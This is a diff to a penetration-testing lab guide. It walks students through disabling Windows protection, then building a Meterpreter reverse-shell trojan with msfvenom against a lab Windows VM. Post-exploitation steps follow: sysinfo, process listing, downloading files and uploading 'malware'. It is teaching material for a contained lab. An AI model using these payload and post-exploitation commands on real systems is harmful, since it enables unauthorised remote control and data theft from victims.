@@ -11,6 +11,10 @@ In this lab, we will set up a penetration testing environment where Parrot Linux
 
 - The two VMs are connected in the same NAT Networks. 
 
+- ⚠️ *If weird phenomenon happens such as software instability:*
+  - *Please uninstall your current VirtualBox, reboot your computer, download and install the latest version of VirtualBox*
+  - *Don't update Windows VM, but update or install the latest version of Parrot Linux*
+
 ---
 
 ### **Task 1: Disable Windows Protection**
@@ -137,11 +141,15 @@ The Trojan we'll create will be a `reverse shell`, which will allow the Parrot L
    use #(to select an exploit)
    set #(to configure options)
    exploit #(to run the exploit)
-   sessions #(to manage active sessions)   
+   sessions #(to manage active sessions)  
+
+   # to get the help of a command
+   # help command_name such as
+   help search 
    ```
 2. Generate a Windows executable payload:
    ```bash
-   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Parrot_VM_IP> LPORT=4444 -f exe -o /root/trojan.exe
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Parrot_VM_IP> LPORT=4444 -f exe -o ./trojan.exe
    ```
    Replace `<Parrot_VM_IP>` with the IP address of the Parrot Linux VM (you can find this using the `ifconfig` command). The `LPORT` is the port that will listen for incoming connections from the Windows VM.
 
@@ -192,19 +200,22 @@ Before executing the Trojan, we need to set up Metasploit to listen for the conn
 Once the Meterpreter session is active, you can perform various post-exploitation tasks:
 1. **Check Active Sessions**:
    ```bash
+   # ⚠️ open another terminal windows or panel and run in msfconsole
    sessions
    ```
 2. **Interact with a Session**:
    ```bash
+   # ⚠️ open another terminal windows or panel and run in msfconsole
    sessions -i <session_id>
    ```
    - 💻 the connected clients
 3. **Common Post-Exploitation Commands**:
-   - **Get system information**:
+   - ⚠️ Run the following command in `Meterpreter` 
+   - **Get victim system information**:
      ```bash
      sysinfo
      ```
-   - **List processes**:
+   - **List processes on the victim system**:
      ```bash
      ps
      ```
@@ -223,8 +234,14 @@ Once the Meterpreter session is active, you can perform various post-exploitatio
      ```
    - **Upload/Download files**:
      ```bash
-     download <file>
-     upload <local_path> <remote_path>
+     # go to Windows current user's Documents folder
+     cd ../Documents 
+     # download <file>
+     # Go to Windows, and create a text file secret.txt in Documents folder first
+     download secret.txt
+     # upload <local_path> <remote_path>
+     # e.g.: upload /home/usr/malware C://Users//Administrator//Documents
+     upload malware # upload to the current remote folder, i.e. Documents
      ```
    - **Open a shell on the target system**:
      ```bash
@@ -232,6 +249,10 @@ Once the Meterpreter session is active, you can perform various post-exploitatio
 
      # exit the remote shell just opened
      exit
+     ```
+   - **Exit meterpreter**:
+     ```bash
+     exit # go back to msfconsole
      ```
 - 💻 Results of all the commands above
 
